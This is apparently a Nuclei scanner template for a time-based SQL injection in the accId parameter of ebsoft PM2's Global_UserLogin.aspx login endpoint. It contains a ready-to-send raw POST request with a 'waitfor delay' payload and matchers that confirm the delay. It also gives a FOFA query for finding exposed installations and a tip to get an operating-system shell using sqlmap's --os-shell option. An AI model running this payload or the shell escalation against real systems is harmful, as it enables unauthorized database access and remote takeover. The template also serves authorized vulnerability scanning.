id: ebsoft-pm2-Global_UserLogin-sqli

info:
  name: ebsoft pm2 Global_UserLogin.aspx - sqli
  author: yy,leadlife
  severity: critical
  description: 北京邦永科技有限公司作为中国领先的专业项目管理软件厂商,由 IDG 资本、美国Intel公司、摩根史坦利等国际着名风险投资机构于2002年共同投资组建，邦永科技PM2项目管理产品的Global_UserLogin.aspx接口对用户传入的参数未进行有效的过滤，直接拼接至SQL查询的语句中，导致SQL注入漏洞，攻击者可利用该漏洞获取数据库的敏感信息。
  metadata:
    veified: true
    fofa-qeury: body="PM2项目管理系统BS版增强工具.zip"
    tips: accId is injection
    sqlmap: |
      getshell sqlmap -r sqli.txt --os-shell
  tags: ebsoft,sqli,rce,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /Global/Global_UserLogin.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)

        accId=lCUnZcAO';%20waitfor%20delay%20'0:0:6'%20--%20&loginCode=e&password=&type=
               
    matchers:     
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 6 && duration <= 9
          - contains(body,'waitfor delay')
          - contains(header,'text/html')
        condition: and
          
